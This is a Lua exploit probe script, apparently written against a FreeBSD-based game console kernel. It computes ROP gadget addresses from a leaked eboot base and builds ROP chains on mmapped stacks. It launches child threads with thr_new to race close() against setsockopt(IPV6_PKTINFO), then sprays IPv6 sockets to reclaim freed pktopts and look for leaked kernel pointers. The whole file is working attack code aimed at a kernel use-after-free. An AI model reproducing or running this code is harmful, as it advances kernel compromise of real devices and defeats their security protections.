-- CRASH_CLASS: HIGH
-- PROBE 1401c: IPv6 pktopts child-thread race v3
--
-- prior art: 1401b child build failed — mmap return check broken,
--   1400a setsockopt(PKTINFO,ifindex=0)=0, 396f/384b child ROP pattern
--
-- Fix: proper uint64 handling for mmap return, test child first

print("=== PROBE 1401c: IPv6 PKTOPTS CHILD RACE v3 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local N = to_num
local function safe_rd(a) local ok, v = pcall(function() return memory.read_dword(a) end); if ok then return N(v) end; return nil end
local function safe_rq(a) local ok, v = pcall(function() return memory.read_qword(a) end); if ok then return v end; return nil end
local function safe_wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function safe_wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(v) if type(v) == "table" and v.h then return v.h, v.l end; return 0, N(v) end

local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_thr_new    = mk(455)
local sc_mmap       = mk(477)
local sc_nanosleep  = mk(240)
local sc_write      = mk(4)
local sc_socketpair = mk(135)

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local IPPROTO_UDP = 17

-- Get eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = mk(593)
pcall(function() sc_info(uint64(0), info) end)
local eboot = (safe_rd(info + 0x10C) or 0) * 0x100000000 + (safe_rd(info + 0x108) or 0)
print(string.format("[0] eboot = 0x%X", eboot))

local pop_rax_ret = eboot + 0x992
local pop_rdi_ret = eboot + 0xC9DFE
local pop_rsi_ret = eboot + 0xD77D
local pop_rdx_ret = eboot + 0x3B02D7
local pop_rcx_ret = eboot + 0xE64
local pop_r8_ret  = eboot + 0x991
local mov_rdi_rax = eboot + 0x92C67  -- mov [rdi], rax; ret

local stub = N(syscall.pipe.fn_addr)
print(string.format("[1] stub = 0x%X", stub))

-- Phase 0: Test a basic child thread first
print("")
print("--- Phase 0: Child thread test ---")

-- Create socketpair for signaling
local sp_buf = memory.alloc(16)
local sp_ret = N(sc_socketpair(uint64(1), uint64(SOCK_DGRAM), uint64(0), uint64(sp_buf)))
local sp_r = safe_rd(sp_buf) or -1
local sp_w = safe_rd(sp_buf + 4) or -1
print(string.format("[T] socketpair = %d, fds = %d, %d", sp_ret, sp_r, sp_w))

-- Allocate child stack
local stack_raw = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local sh, sl = get_hi_lo(stack_raw)
local stack_addr = sh * 0x100000000 + sl
print(string.format("[T] child stack mmap = 0x%X (h=0x%X l=0x%X)", stack_addr, sh, sl))

if stack_addr == 0 then
    print("[!] mmap failed for child stack")
    print("=== PROBE 1401c ABORTED ===")
    return
end

-- Build a test chain: sysarch(SET_FSBASE) + write(sp_w, marker, 8) + thr_exit(0)
local fake_tcb = memory.alloc(0x1000)
safe_wq(fake_tcb, uint64(N(fake_tcb)))
local tcb_ptr_buf = memory.alloc(8)
safe_wq(tcb_ptr_buf, uint64(N(fake_tcb)))

local marker_buf = memory.alloc(16)
safe_wq(marker_buf, uint64(0xCAFEBABE12345678))

local child_rsp = math.floor((stack_addr + 0x200000) / 16) * 16 - 8
local pos = child_rsp

local function push(val)
    safe_wq(pos, uint64(val))
    pos = pos + 8
end

-- Chain: sysarch(129, &tcb) → write(sp_w, marker, 8) → thr_exit(0)
push(pop_rdi_ret); push(129)
push(pop_rsi_ret); push(N(tcb_ptr_buf))
push(pop_rax_ret); push(165)  -- sysarch
push(stub)
-- write(sp_w, marker_buf, 8)
push(pop_rdi_ret); push(sp_w)
push(pop_rsi_ret); push(N(marker_buf))
push(pop_rdx_ret); push(8)
push(pop_rax_ret); push(4)  -- write
push(stub)
-- thr_exit(0)
push(pop_rdi_ret); push(0)
push(pop_rax_ret); push(431)
push(stub)

local param = memory.alloc(0x40)
safe_wq(param + 0x00, uint64(pop_rax_ret))
safe_wq(param + 0x08, uint64(0))
safe_wq(param + 0x10, uint64(stack_addr))
safe_wq(param + 0x18, uint64(0x200000))
local tid_out = memory.alloc(8)
safe_wq(param + 0x30, uint64(N(tid_out)))

local thr_ret = N(sc_thr_new(uint64(param), uint64(0x38)))
print(string.format("[T] thr_new = %d", thr_ret))

-- Wait and check
local slp = memory.alloc(16)
safe_wq(slp, uint64(0))
safe_wd(slp + 8, 50000000)  -- 50 ms
sc_nanosleep(uint64(slp), uint64(0))

-- Read from socketpair
local rd_buf = memory.alloc(16)
safe_wq(rd_buf, uint64(0))
local sc_read = mk(3)
local rd_ret = N(sc_read(uint64(sp_r), uint64(rd_buf), uint64(8)))
local rh, rl = get_hi_lo(safe_rq(rd_buf))
print(string.format("[T] read = %d, data = 0x%X%08X", rd_ret, rh, rl))

if rh == 0xCAFEBABE and rl == 0x12345678 then
    print("[T] Child thread WORKS — marker confirmed!")
else
    print("[T] Child thread marker mismatch — check chain")
    if rd_ret <= 0 then
        print("[T] read failed — child may not have executed")
    end
end
sc_close(uint64(sp_r))
sc_close(uint64(sp_w))

-- Phase 1: Baseline PKTINFO
print("")
print("--- Phase 1: PKTINFO baseline ---")
local test_fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
local pkt = memory.alloc(32)
safe_wq(pkt, uint64(0)); safe_wq(pkt + 8, uint64(0)); safe_wd(pkt + 16, 0)
local r = N(sc_setsockopt(uint64(test_fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt), uint64(20)))
print(string.format("[P1] setsockopt(PKTINFO) = %d", r))
sc_close(uint64(test_fd))
if r ~= 0 then
    print("[!] PKTINFO baseline failed")
    return
end

-- Phase 2: Race with child threads
-- Strategy: each child does a TIGHT loop of its operation
-- Child A: close(fd) × LOOP_COUNT
-- Child B: setsockopt(fd, IPV6_PKTINFO) × LOOP_COUNT
-- Parent: sprays new IPv6 sockets immediately
print("")
print("--- Phase 2: Child thread race ---")

local ROUNDS = 15
local LOOP_COUNT = 100  -- ops per child
local SPRAY_COUNT = 40
local anomalies = 0

for round = 1, ROUNDS do
    -- Create target socket
    local fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 then
        print(string.format("[R%d] socket failed", round))
        break
    end
    -- Enable PKTINFO on it
    safe_wq(pkt, uint64(0)); safe_wq(pkt + 8, uint64(0)); safe_wd(pkt + 16, 0)
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt), uint64(20))

    -- Alloc stacks for children
    local stack_a_raw = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local sah, sal = get_hi_lo(stack_a_raw)
    local stack_a = sah * 0x100000000 + sal

    local stack_b_raw = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local sbh, sbl = get_hi_lo(stack_b_raw)
    local stack_b = sbh * 0x100000000 + sbl

    if stack_a == 0 or stack_b == 0 then
        print(string.format("[R%d] mmap failed", round))
        break
    end

    -- Build child A chain: sysarch + close(fd) × LOOP_COUNT + thr_exit
    local tcb_a = memory.alloc(0x1000)
    safe_wq(tcb_a, uint64(N(tcb_a)))
    local tcp_a = memory.alloc(8)
    safe_wq(tcp_a, uint64(N(tcb_a)))

    local rsp_a = math.floor((stack_a + 0x200000) / 16) * 16 - 8
    pos = rsp_a
    -- sysarch
    push(pop_rdi_ret); push(129)
    push(pop_rsi_ret); push(N(tcp_a))
    push(pop_rax_ret); push(165)
    push(stub)
    -- close(fd) × LOOP_COUNT
    for i = 1, LOOP_COUNT do
        push(pop_rdi_ret); push(fd)
        push(pop_rax_ret); push(6)
        push(stub)
    end
    -- thr_exit
    push(pop_rdi_ret); push(0)
    push(pop_rax_ret); push(431)
    push(stub)

    local param_a = memory.alloc(0x40)
    safe_wq(param_a + 0x00, uint64(pop_rax_ret))
    safe_wq(param_a + 0x08, uint64(0))
    safe_wq(param_a + 0x10, uint64(stack_a))
    safe_wq(param_a + 0x18, uint64(0x200000))

    -- Build child B chain: sysarch + setsockopt(fd, IPV6_PKTINFO) × LOOP_COUNT + thr_exit
    local tcb_b = memory.alloc(0x1000)
    safe_wq(tcb_b, uint64(N(tcb_b)))
    local tcp_b = memory.alloc(8)
    safe_wq(tcp_b, uint64(N(tcb_b)))

    local setopt_buf = memory.alloc(32)
    safe_wq(setopt_buf, uint64(0))
    safe_wq(setopt_buf + 8, uint64(0))
    safe_wd(setopt_buf + 16, 0)

    local rsp_b = math.floor((stack_b + 0x200000) / 16) * 16 - 8
    pos = rsp_b
    -- sysarch
    push(pop_rdi_ret); push(129)
    push(pop_rsi_ret); push(N(tcp_b))
    push(pop_rax_ret); push(165)
    push(stub)
    -- setsockopt(fd, IPPROTO_IPV6, IPV6_PKTINFO, buf, 20) × LOOP_COUNT
    for i = 1, LOOP_COUNT do
        push(pop_rdi_ret); push(fd)
        push(pop_rsi_ret); push(IPPROTO_IPV6)
        push(pop_rdx_ret); push(IPV6_PKTINFO)
        push(pop_rcx_ret); push(N(setopt_buf))
        push(pop_r8_ret);  push(20)
        push(pop_rax_ret); push(105)
        push(stub)
    end
    -- thr_exit
    push(pop_rdi_ret); push(0)
    push(pop_rax_ret); push(431)
    push(stub)

    local param_b = memory.alloc(0x40)
    safe_wq(param_b + 0x00, uint64(pop_rax_ret))
    safe_wq(param_b + 0x08, uint64(0))
    safe_wq(param_b + 0x10, uint64(stack_b))
    safe_wq(param_b + 0x18, uint64(0x200000))

    -- Launch both children simultaneously
    sc_thr_new(uint64(param_a), uint64(0x38))
    sc_thr_new(uint64(param_b), uint64(0x38))

    -- Immediately spray: create new IPv6 sockets to reclaim freed pktopts
    local spray_fds = {}
    for i = 1, SPRAY_COUNT do
        local sfd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
        if sfd >= 0 then
            safe_wq(pkt, uint64(0)); safe_wq(pkt + 8, uint64(0)); safe_wd(pkt + 16, 0)
            local sr = N(sc_setsockopt(uint64(sfd), uint64(IPPROTO_IPV6),
                uint64(IPV6_PKTINFO), uint64(pkt), uint64(20)))
            spray_fds[#spray_fds + 1] = sfd
        end
    end

    -- Wait for children
    safe_wq(slp, uint64(0))
    safe_wd(slp + 8, 100000000)  -- 100 ms
    sc_nanosleep(uint64(slp), uint64(0))

    -- Detect: read PKTINFO from spray sockets, check for non-zero data
    for i, sfd in ipairs(spray_fds) do
        local out = memory.alloc(32)
        safe_wq(out, uint64(0xDEADDEAD)); safe_wq(out+8, uint64(0xDEADDEAD))
        safe_wq(out+16, uint64(0xDEADDEAD))
        local olen = memory.alloc(8)
        safe_wd(olen, 24)
        local gr = N(sc_getsockopt(uint64(sfd), uint64(IPPROTO_IPV6),
            uint64(IPV6_PKTINFO), uint64(out), uint64(olen)))
        if gr == 0 then
            local got_len = safe_rd(olen) or 0
            local q1h, q1l = get_hi_lo(safe_rq(out) or uint64(0))
            local q2h, q2l = get_hi_lo(safe_rq(out + 8) or uint64(0))
            local d5 = safe_rd(out + 16) or 0
            if q1l ~= 0 or q1h ~= 0 or q2l ~= 0 or q2h ~= 0 or d5 ~= 0 then
                anomalies = anomalies + 1
                print(string.format("[R%d] ANOMALY spray[%d] fd=%d len=%d: 0x%X%08X 0x%X%08X ifidx=0x%X",
                    round, i, sfd, got_len, q1h, q1l, q2h, q2l, d5))
                if q1h >= 0xFFFF8000 or q2h >= 0xFFFF8000 then
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
    end

    -- Cleanup
    for _, sfd in ipairs(spray_fds) do sc_close(uint64(sfd)) end

    if round <= 5 or round % 5 == 0 then
        print(string.format("[R%d] done, anomalies=%d, spray=%d", round, anomalies, #spray_fds))
    end
end

print("")
print(string.format("=== RESULTS: %d rounds, %d anomalies ===", ROUNDS, anomalies))
if anomalies > 0 then
    print("*** DATA ANOMALY IN PKTOPTS ***")
else
    print("No anomalies. Race may need more iterations or different approach.")
end
print("=== PROBE 1401c COMPLETE ===")
